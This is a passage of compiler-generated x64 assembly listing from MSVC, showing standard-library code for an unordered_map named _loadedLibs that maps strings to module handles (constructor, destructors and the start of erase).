?at@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAAEAPEAUHINSTANCE__@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ENDP ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::at
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
;	COMDAT ??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$dead$ = 48
this$ = 48
??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ PROC ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >, COMDAT

; 101  :     unordered_map() : _Mybase(_Key_compare(), allocator_type()) {}

$LN80:
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 32					; 00000020H
	lea	rdi, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	mov	QWORD PTR this$[rsp], rdi

; 49   :     explicit _Umap_traits(const _Tr& _Traits) noexcept(is_nothrow_copy_constructible_v<_Tr>) : _Tr(_Traits) {}

	mov	DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A, 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 353  :     _List_val() noexcept : _Myhead(), _Mysize(0) {} // initialize data

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8, 0
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16, 0

; 1838 :         auto _Newhead = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new

; 1839 :         _Construct_in_place(_Newhead->_Next, _Newhead);

	mov	QWORD PTR [rax], rax

; 1840 :         _Construct_in_place(_Newhead->_Prev, _Newhead);

	mov	QWORD PTR [rax+8], rax

; 1841 :         _Mypair._Myval2._Myhead = _Newhead;

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24, 0
	xorps	xmm0, xmm0
	movdqa	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+32, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 373  :         : _Traitsobj(_Parg), _List(_Al), _Vec(_Al), _Mask(_Min_buckets - 1), _Maxidx(_Min_buckets) {

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48, 7
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56, 8

; 374  :         // construct empty hash table
; 375  :         _Max_bucket_size() = _Bucket_size;

	mov	DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A, 1065353216 ; 3f800000H

; 376  :         _Vec._Assign_grow(_Min_buckets * 2, _List._Unchecked_end());

	mov	r8, rax
	mov	edx, 16
	lea	rcx, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	call	?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Assign_grow
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map

; 101  :     unordered_map() : _Mybase(_Key_compare(), allocator_type()) {}

	mov	rax, rdi
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ENDP ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
this$ = 48
?dtor$1@?0???0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ@4HA PROC ; `std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >'::`1'::dtor$1
	mov	rcx, QWORD PTR this$[rdx]
	add	rcx, 8
	jmp	??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
?dtor$1@?0???0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ@4HA ENDP ; `std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
this$ = 48
?dtor$2@?0???0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ@4HA PROC ; `std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >'::`1'::dtor$2
	mov	rcx, QWORD PTR this$[rdx]
	add	rcx, 24
	jmp	??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::~_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >
?dtor$2@?0???0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ@4HA ENDP ; `std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ PROC ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::~_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >, COMDAT

; 318  :     ~_Hash_vec() {

$LN38:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 309  :         if (_Mypair._Myval2._Myfirst != nullptr) {

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN5@Hash_vec

; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN27@Hash_vec

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN24@Hash_vec

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN27@Hash_vec:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 312  :             _Mypair._Myval2._Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 313  :             _Mypair._Myval2._Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 314  :             _Mypair._Myval2._Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN5@Hash_vec:

; 324  :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN24@Hash_vec:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN35@Hash_vec:
??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ENDP ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::~_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z
_TEXT	SEGMENT
$T1 = 32
this$dead$ = 64
_Keyval$ = 72
?erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::erase, COMDAT

; 1135 :     size_type erase(const key_type& _Keyval) noexcept(noexcept(_Erase(_Keyval))) /* strengthened */ {

$LN171:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+24], rsi
	push	rdi
	sub	rsp, 48					; 00000030H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r8, rdx

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r9, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN21@erase

